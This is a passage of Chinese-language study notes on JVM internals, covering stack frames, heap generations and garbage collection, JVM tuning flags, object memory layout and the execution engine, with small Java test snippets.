<h3 id="3-2-1-栈帧"><a href="#3-2-1-栈帧" class="headerlink" title="3.2.1 栈帧"></a>3.2.1 栈帧</h3><h4 id="1）局部变量表（Local-Variables）"><a href="#1）局部变量表（Local-Variables）" class="headerlink" title="1）局部变量表（Local Variables）"></a>1）局部变量表（Local Variables）</h4><p>​		主要用来存放方法的参数和定义在方法内的局部变量，数据类型包括：8种基本数据类型、对象引用（reference类型）和returnAddress类型。这些数据类型在局部变量表中的存储空间以局部变量槽（Slot）来表示，long和double类型数据占用两个变量槽，其余的数据类型只占用一个，下标为0的变量槽存放this（如果是实例方法）。局部变量表所需的内存空间在编译期间完成分配，在方法运行期间不会改变局部变量表的大小（保存在方法的Code属性的maximum local variables数据项中），这里说的”大小“是指变量槽的数量。局部变量表中的变量只在当前方法调用中有效，当方法调用结束后，局部变量表随着栈帧销毁。</p>
<p>测试局部变量表最大槽数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LVTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String info;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">LVTest</span>().test1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.info = <span class="string">&quot;test1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">test2</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">10L</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3，局部变量b创建后又马上销毁，c存放在销毁前b的槽中。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">test3</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">            b = a + b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> a + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2，但只有下标为0的槽存放了this，a没有被存放，因为a没有初始化，不能使用。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>静态变量与局部变量区别：静态变量会进行2次初始化（类加载的准备阶段和初始化阶段）；局部变量在使用前必须手动初始化。</p>
<p>1）局部变量压栈指令：</p>
<ul>
<li>xload_n   x表示数据类型，可选：i、l、f、d、a（引用类型）；n表示局部变量表的下标，可选：0、1、2、3。表示把局部变量表下标为n、类型为x的数据放入操作数栈的顶部。</li>
<li>xload n    x同上，n &gt; 3。</li>
</ul>
<p>2）常数入栈指令（const系列、push系列、ldc系列）：</p>
<p>​	const系列：</p>
<ul>
<li>iconst_m1	将-1压入操作数栈。</li>
<li>iconst_x		将x（0到5）压入操作数栈。</li>
<li>lconst_x		将长整型x（0到1）压入操作数栈。</li>
<li>fconst_x		将浮点数x（0、1、2）压入操作数栈。</li>
<li>dconst_x		将双精度浮点数x（0、1）压入操作数栈。</li>
<li>aconst_null		将null压入操作数栈。</li>
</ul>
<p>​	push系列：</p>
<ul>
<li>bipush		8位整数入栈</li>
<li>sipush		16位整数入栈</li>
</ul>
<p>​	ldc系列：</p>
<ul>
<li>ldc_w		接收两个8位参数，支持索引范围大于ldc</li>
</ul>
<p>3）出栈存入局部变量表：</p>
<ul>
<li>xstore_n	x表示数据类型，可选：i、l、f、d、a（引用类型）；n表示局部变量表的下标，可选：0、1、2、3。表示移除操作数栈顶元素，并存储到局部变量表下标为n的位置。</li>
<li>xstore n    x同上，n &gt; 3。</li>
</ul>
<h4 id="2）操作数栈（Operand-Stack）"><a href="#2）操作数栈（Operand-Stack）" class="headerlink" title="2）操作数栈（Operand Stack）"></a>2）操作数栈（Operand Stack）</h4><p>​		每一个操作数栈（后进先出）都会拥有一个明确的栈深度用于存储数值，其最大深度在编译期就定义好了，保存在方法的Code属性中的max_stack值。long、float占用2个栈深度，其余占用1个栈深度。如果被调用的方法带有返回值，其返回值将会被压入当前栈帧的操作数栈中，并更新程序计数器中下一条需要执行的字节码指令。</p>
<p>测试操作数栈最大深度：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OSTest</span> &#123;</span><br><span class="line">    <span class="comment">// 2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4，return语句中的加法运算，会先把i转为long（指令i2l），因此深度2+2=4</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">10L</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> i + l;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>栈顶缓存（Tos，Top-of-Stack Cashing）技术：将栈顶元素全部缓存在物理CPU的寄存器中，来降低对内存的读写次数，提升执行引擎的执行效率。</p>
<h4 id="3）动态链接（Dynamic-Linking）"><a href="#3）动态链接（Dynamic-Linking）" class="headerlink" title="3）动态链接（Dynamic Linking）"></a>3）动态链接（Dynamic Linking）</h4><p>每一个栈帧内部都包含一个指向运行时常量池中该栈帧所属方法的引用，使得当前方法的代码支持动态链接。</p>
<p>作用：符号引用转为调用方法的直接引用。</p>
<p>常量池作用：提供符号和常量，便于指令识别。</p>
<p>符号引用转为调用方法的直接引用与方法的绑定机制相关：</p>
<ul>
<li>静态链接：当一个字节码文件被加载进JVM内部时，如果被调用的目标方法在编译期可知，且运行时保持不变。这种情况下将调用方法的符号引用转换为直接引用的过程为静态链接。</li>
<li>动态链接：如果被调用的方法在编译器无法被确定下来，也就是说，只能够在程序运行期将调用方法的符号引用转换为直接引用，由于这种引用转换过程具备动态性，因此也就被称为动态链接。</li>
</ul>
<p>对应的方法绑定机制（绑定是一个字段、方法或者类在符号引用被替换为直接引用的过程，这仅仅发生一次。）：</p>
<ul>
<li>早期绑定：被调用的目标方法如果在编译器期可知，且运行期保持不变，即可将这个方法与所属的类型进行绑定，这样一来，由于明确了被调用的目标方法究竟是哪一个，因此也就可以使用静态链接的方式将符号引用转换为直接引用。</li>
<li>晚期绑定：如果被调用的方法在编译器无法被确定下来，只能够在程序运行期根据实际的类型绑定相关的方法，这种绑定方式也就被称为晚期绑定。</li>
</ul>
<h4 id="4）方法返回地址（Return-Address）"><a href="#4）方法返回地址（Return-Address）" class="headerlink" title="4）方法返回地址（Return Address）"></a>4）方法返回地址（Return Address）</h4><p>​		存放调用该方法的程序计数器的值，无论方法正常退出或异常退出，都会返回到该方法被调用的位置。正常退出时，调用者的程序计数器的值作为返回地址，即调用该方法的指令下一条指令地址；异常退出时，返回地址要通过异常表来确定，栈帧中一般不会保存这部分信息。</p>
<p>退出指令：ireturn（返回值是boolean、byte、char、short、int类型）、lreturn、freturn、dreturn、areturn、return（void方法、实例初始化方法、类和接口初始化方法）。异常退出不会给它的上层调用者产生任何的返回值。</p>
<h4 id="5）附加信息"><a href="#5）附加信息" class="headerlink" title="5）附加信息"></a>5）附加信息</h4><p>《Java虚拟机规范》允许虚拟机的实现增加一些规范里没有描述的信息到栈帧之中，例如与调试、性能收集相关的信息，这部分信息完全取决于具体的虚拟机实现。一般会把动态链接、方法返回地址与其他附加信息全部归为一类，称为栈帧信息。</p>
<h3 id="3-2-2-相关JVM参数"><a href="#3-2-2-相关JVM参数" class="headerlink" title="3.2.2 相关JVM参数"></a>3.2.2 相关JVM参数</h3><p><em>size</em>可选的单位：不写单位（子节）、k、K、m、M、g、G。</p>
<ul>
<li>-Xss<em>size</em>（或 -XX:ThreadStackSize&#x3D;<em>size</em>）设置线程的栈内存，32位Linux默认320k，64位Linux默认1024k，Windows下默认值依据虚拟内存。若设置栈空间过大，会导致可创建的线程数减少，通常一个进程有3000-5000个线程。</li>
</ul>
<h3 id="3-2-3-特点"><a href="#3-2-3-特点" class="headerlink" title="3.2.3 特点"></a>3.2.3 特点</h3><ol>
<li>线程私有，生命周期与线程的一致。</li>
<li>不存在GC，存在SOF和OOM。</li>
</ol>
<p>StackOverflowError：线程请求的栈深度大于虚拟机所允许的深度。（方法无限递归调用；局部变量表过长，导致栈帧过大，没存几个就溢出。）</p>
<p>OutOfMemoryError：如果虚拟机栈容量可以动态扩展，且扩展时无法申请到足够的内存；或者创建新线程时没有足够的内存去创建对应的虚拟机栈。（HotSpot虚拟机的栈容量是不可以动态扩展的，所以HotSpot的虚拟机栈不会出现第一种情况，只可能是创建的线程过多而导致栈的OOM。）</p>
<p>方法中定义的局部变量是否线程安全：如果局部变量在内部产生并在内部消亡，那就是线程安全的。</p>
<h2 id="3-3-本地方法栈"><a href="#3-3-本地方法栈" class="headerlink" title="3.3 本地方法栈"></a>3.3 本地方法栈</h2><p>​		虚拟机栈用来管理Java方法的调用，而本地方法栈用来管理本地方法的调用。当某个线程调用一个本地方法时，它就进入了一个全新的并且不再受虚拟机限制的世界，与虚拟机拥有同样的权限。与虚拟机栈类似，也是允许被实现成固定或者可动态扩展的内存大小。</p>
<h3 id="3-3-1-特点"><a href="#3-3-1-特点" class="headerlink" title="3.3.1 特点"></a>3.3.1 特点</h3><ol>
<li>线程私有，生命周期与线程的一致。</li>
<li>不存在GC，存在SOF和OOM（溢出情况与虚拟机栈的类似）。</li>
</ol>
<h2 id="3-4-堆"><a href="#3-4-堆" class="headerlink" title="3.4 堆"></a>3.4 堆</h2><p>​		堆在JVM启动时被创建，空间大小也确定了，是运行时数据区中最大的区域，也是GC的重点区域。一个JVM实例只存在一个堆内存，堆也是Java内存管理的核心区域。在方法结束后，堆中的对象不会立马被移除，仅仅在垃圾收集时才会被移除。几乎所有对象都分配在堆上，除了使用“栈上分配”去特殊处理。</p>
<p>​		所有的线程都共享堆，在这里还可以划分线程私有的缓冲区（Thread Local Allocation Buffer, TLAB）。</p>
<p>存储在JVM的Java对象可以被划分为两类：</p>
<ul>
<li>一类是生命周期短，对象的创建和消亡都非常迅速。</li>
<li>另一类是生命周期非常长，某些极端情况下与JVM生命周期保持一致。</li>
</ul>
<h3 id="3-4-1-分代"><a href="#3-4-1-分代" class="headerlink" title="3.4.1 分代"></a>3.4.1 分代</h3><p>目的：根据对象不同的生命周期和大小，划分到不同内存区域，按照各自的特性采取不同垃圾收集算法，提高GC效率。对象整体流转过程：①②③④</p>
<h4 id="1）新生代"><a href="#1）新生代" class="headerlink" title="1）新生代"></a>1）新生代</h4><p>新生代（Young &#x2F; New generation，新生区，简写：Young &#x2F; New，YoungGen）：</p>
<ul>
<li>伊甸园（Eden）：几乎所有的Java对象都在Eden区被new出来（大对象直接进入养老区）。①当Eden区满了且程序又需要创建对象时，触发Minor GC。</li>
<li>Survivor0（From）：③清空Eden区和From区，From区和To区交换。下次GC时，存活的对象进入新的To区。</li>
<li>Survivor1（To）：②复制Eden区和From区的存活对象进To区，年龄加1。</li>
</ul>
<p>IBM研究表明，新生代80%的对象都在此销毁，不会进入老年代。</p>
<p>本地线程分配缓冲（Thread Local Allocation Buffer，TLAB）：</p>
<ul>
<li>对象创建时，按照线程来划分不同的私有空间（Eden区内），OpenJDK衍生的JVM都提供了TLAB的设计。</li>
<li>不是所有的对象实例都能在TLAB中成功分配，但它是JVM内存分配的首选，可通过”-XX:+&#x2F;-UseTLAB“设置是否开启TLAB空间。</li>
<li>默认情况下，TLAB空间内存非常小（Eden的1%），可通过“-XX:TLABWasteTargetPercent”设置其占用Eden区的百分比大小。</li>
<li>一旦对象在TLAB空间分配内存失败，JVM就会尝试通过加锁机制确保数据操作的原子性，从而直接在Eden区分配内存。</li>
</ul>
<h4 id="2）老年代"><a href="#2）老年代" class="headerlink" title="2）老年代"></a>2）老年代</h4><p>老年代（Tenured &#x2F; Old generation，养老区，简写：Old &#x2F; Tenure，OldGen）：④当年龄达到阈值后，进入养老区。养老区空间不足时，触发Major GC，垃圾收集后空间仍然不足导致OOM。</p>
<p>动态对象年龄判断：如果Survivor区相同年龄的所有对象的总大小大于Survivor空间的一半，年龄大于或等于该年龄的对象可以直接进入养老区，不需要等到指定的年龄。</p>
<p>空间分配担保：在发生Minor GC之前，虚拟机必须先检查老年代最大可用的连续空间是否大于新生代所有对象总空间。</p>
<ul>
<li><p>如果大于，那这次Minor GC是安全的。</p>
</li>
<li><p>如果小于，则虚拟机会先查看-XX:HandlePromotionFailure参数的设置值是否允许担保失败（Handle Promotion Failure）。</p>
<ul>
<li><p>如果允许，那么会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小。</p>
<ul>
<li><p>如果大于，将尝试进行一次Minor GC，尽管这次Minor GC是有风险的。</p>
</li>
<li><p>如果小于，则改为进行一次Full GC。</p>
</li>
</ul>
</li>
<li><p>如果不允许，则改为进行一次Full GC。</p>
</li>
</ul>
</li>
</ul>
<p>在JDK 6 Update 24之后，-XX:HandlePromotionFailure参数不会再影响到虚拟机的空间分配担保策略，已经不再使用它。JDK 6 Update 24之后的规则变为只要老年代的连续空间大于新生代对象总大小或者历次晋升的平均大小，就会进行Minor GC，否则将进行Full GC。</p>
<p>Minor GC、Major GC、Full GC区别：</p>
<ul>
<li><p>Minor GC（Young GC &#x2F; YGC）：</p>
<ul>
<li>新生代的垃圾收集。</li>
<li>频率高，速度快，会导致STW（暂停整个应用程序的线程）。</li>
<li>触发时机：Eden区满了且老年代的连续空间大于新生代对象总大小或者历次晋升的平均大小，触发Minor GC。</li>
</ul>
</li>
<li><p>Major GC（Old GC）：</p>
<ul>
<li>老年代的垃圾收集。</li>
<li>速度一般比Minor GC慢10倍以上，STW时间更长，Major GC后空间还不足，会导致OOM。</li>
<li>触发时机：老年代空间不足时，通常至少先进行一次Minor GC（不一定），空间仍然不足，触发Major GC。</li>
</ul>
</li>
<li><p>Full GC（FGC）：</p>
<ul>
<li>整个堆和方法区的垃圾收集。</li>
<li>速度最慢，STW时间最长。</li>
<li>触发时机：<ul>
<li>调用System.gc()（或Runtime.getRuntime().gc()）时，系统建议执行Full GC，但不一定执行。</li>
<li>老年代空间不足。</li>
<li>方法区空间不足。</li>
<li>在Minor GC之前，检查到老年代的连续可用空间小于历次晋升到老年代的对象的平均大小，改为Full GC。</li>
<li>把对象从Eden区、From区复制到To区时，To区空间不足且养老区空间也不足。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-4-2-相关JVM参数"><a href="#3-4-2-相关JVM参数" class="headerlink" title="3.4.2 相关JVM参数"></a>3.4.2 相关JVM参数</h3><p><em>size</em>可选的单位：不写单位（子节）、k、K、m、M、g、G。</p>
<ul>
<li>-Xms<em>size</em>（或-XX:InitialHeapSize&#x3D;<em>size</em>）设置堆的初始大小。</li>
<li>-Xmx<em>size</em>（或-XX:MaxHeapSize&#x3D;<em>size</em>）设置堆的最大值。超出设定的最大值时，导致OutOfMemoryError:heap异常。通常-Xms和-Xmx配置相同的值，避免GC后重新计算分配堆的大小，从而提高性能。</li>
<li>-Xmn<em>size</em>，设置新生代的初始大小（-XX:NewSize&#x3D;<em>size</em>）和最大值（-XX:MaxNewSize&#x3D;<em>size</em>），一般不调整。</li>
<li>-XX:NewRatio&#x3D;2，表示 新生代:老年代 &#x3D; 1:2（默认），新生代占整个堆的1&#x2F;3，一般不调整。</li>
<li>-XX:SurvivorRatio&#x3D;8，表示 Eden:S0:S1 &#x3D; 8:1:1（默认，使用默认值时，具体的比例与收集器有关，JDK 8默认的并行收集器，将其调整为6:1:1）。</li>
<li>-XX:MaxTenuringThreshold&#x3D;15，设置对象进入老年代的年龄（并行收集器默认15，CMS收集器默认6）。</li>
<li>-XX:+PrintGCDetails，开启GC详细信息的打印，默认关闭。</li>
<li>-XX:HandlePromotionFailure，是否允许空间分配担保。</li>
<li>-XX:+PrintFlagsFinal，查看JVM默认参数。（最终值，若默认值被覆盖，显示新值。）</li>
</ul>
<p>默认堆内存大小，<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/vm/gctuning/parallel.html#default_heap_size">JDK 8官方解析</a>，如下图所示：</p>
<p><img src="/../img/default_heap_size.png"></p>
<p>1）客户端模式的JVM（32位的JDK默认Client模式，java -version查看）：</p>
<ul>
<li>默认最大堆内存：若物理内存小于192MB，默认为物理内存的1&#x2F;2；否则，默认为物理内存的1&#x2F;4，且最大为1024MB&#x2F;4&#x3D;256MB（物理内存大于等于1GB）。</li>
<li>默认最小堆内存：物理内存的1&#x2F;64，但最少8MB；若物理内存大于等于1GB，默认为1024MB&#x2F;64&#x3D;16MB。</li>
</ul>
<p>2）服务器模式的JVM（64位的JDK默认Server模式，且没有客户端模式）：</p>
<ul>
<li>与客户端模式类似，不同的是，最大堆内存为：1GB（32位且物理内存大于等于4G），或32GB（64位且物理内存大于等于128GB）。</li>
</ul>
<p>测试代码1：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">System.out.println(<span class="string">&quot;-Xms: &quot;</span> + runtime.totalMemory()*<span class="number">1.0</span>/<span class="number">1024</span>/<span class="number">1024</span> + <span class="string">&quot;MB&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;-Xmx: &quot;</span> + runtime.maxMemory()*<span class="number">1.0</span>/<span class="number">1024</span>/<span class="number">1024</span> + <span class="string">&quot;MB&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="3-4-3-特点"><a href="#3-4-3-特点" class="headerlink" title="3.4.3 特点"></a>3.4.3 特点</h3><ol>
<li>线程共享。</li>
<li>存在GC，存在OOM。</li>
</ol>
<p>堆和栈的区别：</p>
<ol>
<li>堆存在GC，栈不存在GC；堆栈都存在OOM。</li>
<li>堆内存大，执行效率慢；栈内存小，执行效率高。</li>
<li>堆可以是任何数据结构；栈就是栈结构。</li>
<li>堆管对象的存储，栈管方法的运行。</li>
</ol>
<h2 id="3-5-方法区"><a href="#3-5-方法区" class="headerlink" title="3.5 方法区"></a>3.5 方法区</h2><p>​		方法区（Method Area）与堆一样是线程共享的，存储被虚拟机加载的类型信息、常量、静态变量（JDK 7及之后移到堆）、即时编译器编译后的代码等数据。《Java虚拟机规范》中把方法区描述为堆的一个逻辑部分，为了与堆区分开来，又叫作“非堆”（Non-Heap）。</p>
<p>方法区在不同JDK版本的实现方式：</p>
<ul>
<li><p>JDK 6：永久代（Permanent Generation，Perm），存储类型信息、常量、静态变量、即时编译器编译后的代码，以及字符串常量池。</p>
</li>
<li><p>JDK 7：永久代（Permanent Generation，Perm），把原本放在永久代的字符串常量池、静态变量等移到堆。</p>
</li>
<li><p>JDK 8：元空间（Meta space，Meta），完全废弃了永久代，改用通过本地内存（Native Memory）来实现的元空间来代替，主要存储类型信息。</p>
</li>
</ul>
<p>方法区的垃圾收集主要有两部分内容：</p>
<ul>
<li>常量池中废弃的常量（字面量和符号引用）。符号引用包括<code>类和接口的全限定名</code>、<code>字段的名称和描述符</code>、<code>方法的名称和描述符</code>。只要常量池中的常量没有被任何地方引用，就可以被回收。</li>
<li>不再使用的类型。需要满足3个条件：1.该类的所有实例都已经被回收；2.加载该类的类加载器已经被回收；3.该类对应的java.lang.Class对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法。Java虚拟机被允许对满足上述三个条件的无用类进行回收，这里说的仅仅是“被允许”，而并不是和对象一样，没有引用了就必然会回收。</li>
</ul>
<p>字符串常量池转移到堆的原因：永久代的回收效率很低，只有Full GC时才会触发，而Full GC频率很低，导致大量的字符串回收不及时。</p>
<p>测试字符串常量池的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StrTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">        System.out.println(s1 == s2);           <span class="comment">// false</span></span><br><span class="line">        System.out.println(s1 == s1.intern());  <span class="comment">// false</span></span><br><span class="line">        System.out.println(s2 == s2.intern());  <span class="comment">// true</span></span><br><span class="line">        System.out.println(s1 == s2.intern());  <span class="comment">// false</span></span><br><span class="line">        System.out.println(s2 == s1.intern());  <span class="comment">// true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-5-1-相关JVM参数"><a href="#3-5-1-相关JVM参数" class="headerlink" title="3.5.1 相关JVM参数"></a>3.5.1 相关JVM参数</h3><p><em>size</em>可选的单位：不写单位（子节）、k、K、m、M、g、G。</p>
<ul>
<li>-XX:PermSize&#x3D;<em>size</em>，设置永久代的初始大小，超出设定的大小将触发垃圾收集，默认20.75M。（JDK 8之前）</li>
<li>-XX:MaxPermSize&#x3D;<em>size</em>，设置永久代的最大值，默认64M（32位）、82M（64位）。（JDK 8之前）</li>
<li>-XX:MetaspaceSize&#x3D;<em>size</em>，设置元空间的初始大小，首次超出设定的大小将触发垃圾收集，若回收的空间较大，适当降低触发垃圾收集的阈值，反之，适当提高触发垃圾收集的阈值，Windows默认21M左右，与系统有关。（JDK 8及之后）</li>
<li>-XX:MaxMetaspaceSize&#x3D;<em>size</em>，设置元空间的最大值，默认无限制。（JDK 8及之后）</li>
</ul>
<p>建议：适当地把方法区初始大小设置偏大，避免频繁Full GC。</p>
<h3 id="3-5-2-特点"><a href="#3-5-2-特点" class="headerlink" title="3.5.2 特点"></a>3.5.2 特点</h3><ol>
<li>线程共享。</li>
<li>存在GC（Full GC），存在OOM（加载过多的类）。</li>
</ol>
<h1 id="4-对象内存布局"><a href="#4-对象内存布局" class="headerlink" title="4. 对象内存布局"></a>4. 对象内存布局</h1><h2 id="4-1-对象的实例化"><a href="#4-1-对象的实例化" class="headerlink" title="4.1 对象的实例化"></a>4.1 对象的实例化</h2><h3 id="1）对象创建的方式"><a href="#1）对象创建的方式" class="headerlink" title="1）对象创建的方式"></a>1）对象创建的方式</h3><ol>
<li>new创建。</li>
<li>反射创建。（Class的newInstance()、Constructor的newInstance(参数)）</li>
<li>浅克隆。（实现Cloneable接口的clone()方法）</li>
<li>反序列化。（深克隆）</li>
<li>第三方库Objenesis。（通过asm动态生成Constructor对象）</li>
</ol>
<h3 id="2）对象创建的步骤"><a href="#2）对象创建的步骤" class="headerlink" title="2）对象创建的步骤"></a>2）对象创建的步骤</h3><ol>
<li>类加载。（加载、链接、初始化）</li>
<li>对象内存分配。<ul>
<li>指针碰撞：若内存规整，虚拟机采用指针碰撞法来分配对象内存。意思是已用内存和空闲内存中间用指针作为分界点的指示器，内存分配只需要把指针往空闲内存方向挪动一段与对象大小相等的内存。基于压缩算法的收集器，都采用这种分配方式。</li>
<li>空闲列表：若内存不规整，虚拟机采用空闲列表来分配对象内存。意思是虚拟机通过维护一个空闲内存的列表，在内存分配时，从列表中找到一块足够大的空间进行内存分配，并更新列表上的内容。</li>
</ul>
</li>
<li>对象内存分配的并发问题。<ul>
<li>CAS：对象内存分配时通过CAS来确保原子性。</li>
<li>TLAB：按照不同的线程，在堆中划分一块小的缓冲区用于对象内存分配。</li>
</ul>
</li>
<li>初始化分配的空间。<ul>
<li>把内存空间进行零值初始化（对象头除外）。主要是把实例字段进行零值初始化。</li>
</ul>
</li>
<li>设置对象头。<ul>
<li>将类的元数据、对象的HashCode、对象的GC信息、锁信息等数据存储在对象头。</li>
</ul>
</li>
<li>执行<code>&lt;init&gt;()</code>方法进行初始化。<ul>
<li>初始化实例字段，执行实例化代码块，调用构造方法，并把对象的首地址赋值给引用变量。</li>
</ul>
</li>
</ol>
<p>对应的字节码：</p>
<ul>
<li>new指令：若找不到对应的Class对象，先进行类加载。加载后，在堆中分配内存（Object到当前类路径上所有属性值都要分配内存），然后对其进行零值初始化，分配过程中，引用类型占用4个子节。最后将对象的引用压入操作数栈顶。</li>
<li>dup指令：复制栈顶对象引用，压入栈顶，此时栈顶有两个指向同一对象的引用。如果<code>&lt;init&gt;()</code>方法有参数，还需要将参数进行压栈。靠近顶部的对象引用用来调用方法，靠近底部的对象引用用来赋值或保存到局部变量表。</li>
<li>invokespecial指令：调用对象的实例方法，靠近顶部的对象引用调用<code>&lt;init&gt;()</code>方法。</li>
</ul>
<p>注：<code>&lt;clinit&gt;()</code>是类初始化时执行的方法，<code>&lt;init&gt;()</code>是对象初始化时执行的方法。</p>
<h2 id="4-2-对象的内存布局"><a href="#4-2-对象的内存布局" class="headerlink" title="4.2 对象的内存布局"></a>4.2 对象的内存布局</h2><ul>
<li><p>对象头（Header）：</p>
<ul>
<li>标记字段（Mark Word）：哈希值（HashCode）、偏向的线程ID、GC分代年龄、偏向锁位、锁标志位。</li>
<li>类型指针（Klass Word）：指向元数据区类的元数据（instanceKlass），确定对象的类信息。</li>
<li>数组长度：对象为数组时，记录数组的长度。</li>
</ul>
</li>
<li><p>实例数据（Instance Data）：存储对象的有效信息，包括对象的各种属性（包括父类属性）等。</p>
<p>遵循的规则：</p>
<ul>
<li>相同宽度的字段分配在一起；</li>
<li>父类定义的变量出现在子类之前（父类先于子类加载）；</li>
<li>如果CompactFields参数为true（默认），子类的窄变量可能插入到父类变量的空隙。</li>
</ul>
</li>
<li><p>对其填充（Padding）：非必须，仅仅起到占位符的作用。</p>
</li>
</ul>
<p><img src="/../img/object_structure.png"></p>
<h2 id="4-3-对象的访问定位"><a href="#4-3-对象的访问定位" class="headerlink" title="4.3 对象的访问定位"></a>4.3 对象的访问定位</h2><p>访问定位：栈帧中的reference &#x3D;&gt; 堆中的instanceOopDesc对象 &#x3D;&gt; 方法区中的instanceKlass对象，对象访问方式主流有两种：</p>
<ul>
<li>句柄访问：堆中划分一块内存作为句柄池，reference中存储对象的句柄地址，而句柄中包含了对象实例数据与类型数据各自具体的地址信息。<ul>
<li>优点：垃圾收集导致对象地址发生改变时，reference不需要修改，只需要修改句柄中对象的指针。</li>
<li>缺点：访问定位时，多了一步定位到句柄的操作。</li>
</ul>
</li>
<li>直接指针访问（HotSpot主要使用）：reference中存储的就是对象地址。访问定位时，不需要多一次定位操作。</li>
</ul>
<h1 id="5-执行引擎"><a href="#5-执行引擎" class="headerlink" title="5. 执行引擎"></a>5. 执行引擎</h1><p>作用：对字节码指令进行解释执行（通过解释器解释执行）和编译执行（通过即时编译器生成机器指令执行）。（字节码指令 &#x3D;&gt; 本地机器指令）</p>
<p>后端编译器：</p>
<ul>
<li>即时编译器（Just In Time，JIT），在程序运行中，把热点代码（热点字节码）转换为可在硬件上直接运行的机器码，并部署至托管环境中（方法区的CodeCache）。</li>
<li>静态提前编译器（Ahead Of Time Compiler，AOT），JDK 9引入，在运行前已经把字节码转换为机器码（.class &#x3D;&gt; .so），避免了”第一次运行慢“的情况，但无法”一次编译，到处运行“，且要求代码在编译期就全部已知。</li>
</ul>
<p>Java是半编译半解释语言：执行引擎中，热点代码通过JIT编译执行，非热点代码通过解释器逐行解释执行。</p>
<p>解释器和即时编译器并存：</p>
<ul>
<li>-Xint：完全采用解释器执行。</li>
<li>-Xcomp：完全采用即时编译器执行。即时编译出现问题，解释器会介入执行。</li>
<li>-Xmixed：采用解析器+即时编译器混合执行。（默认）</li>
</ul>
